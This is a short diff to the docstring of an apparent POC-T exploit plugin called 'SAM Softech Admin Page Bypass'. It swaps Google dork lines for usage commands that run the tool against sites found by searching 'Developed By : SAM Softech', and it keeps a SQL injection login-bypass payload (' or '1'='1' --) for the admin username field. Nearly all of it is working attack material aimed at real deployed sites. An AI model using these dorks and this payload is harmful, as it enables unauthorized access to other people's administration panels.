@@ -6,9 +6,9 @@
 """
 SAM Softech Admin Page Bypass
 
-Dork
-  Google Dork:intext:Developed By : SAM Softech
-  Google Dork:"Developed By : SAM Softech"
+Usage
+  python POC-T.py -s samsoftech-admin-bypass -aG "intext:Developed By : SAM Softech"
+  python POC-T.py -s samsoftech-admin-bypass -aG "Developed By : SAM Softech"
 
 Payload
   Username: ' or '1'='1' -- ' ~ ' or '1'='1'
